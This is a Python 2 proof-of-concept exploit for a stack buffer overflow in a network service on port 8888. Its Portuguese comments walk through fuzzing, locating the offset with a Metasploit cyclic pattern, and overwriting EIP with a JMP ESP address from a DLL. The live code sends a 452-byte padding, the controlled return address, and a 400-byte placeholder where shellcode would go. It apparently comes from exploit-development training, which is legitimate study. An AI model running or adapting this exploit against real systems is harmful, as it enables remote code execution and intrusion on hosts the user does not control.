#!/usr/bin/python

import sys, socket
from struct import *

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

# passo 1 - teste de conectividade
# buffer = "A" * 1000

# passo 2 - vem do passo1, em que com um fuzzer, descobre-se que a aplicacao crasheia, e assim, contador=500
# outro arquivo, pois o poc nao precisa fazer loop

# passo 3 - gera-se uma string com msf-pattern-create -l 500 (vindo de passo2-fuzzing). Assim, descobre-se o endereco exato em que aplicacao crashei, encontrado o eip
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

# passo 4 - sabemos de passo 3 que o offset e 452, pois o conteudo de eip apos o envio de poc3 ficou 31704130, e ao darmos msf-pattern_offset -q 31704130 ficou 452
# offset = "A" * 452
# eip = "BBBB"
# esp = "C" * 400

# passo 5  - temos que o offset e 452, e agora controlamos eip. Agora achamos esp para que possamos preencher com o shellcode. Assim, precisamos que o eip salte para o esp. Digitamos no immunity debugger !mona jmp -r esp e acessamos no log para verificar um endereco de uma dependencia, pois as dlls possuem endereco fixo. Pegamos o endereco da lib helvio, que eh 6B841615.
offset = "A" * 452
eip = pack('<L',0x6B841615)
esp = "C" * 400


buffer = offset + eip + esp

buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
# print "Sending evil buffer de %s bytes" %contador
print buffer
s.send(buffer)
print "[+] buffer enviado"
s.close()



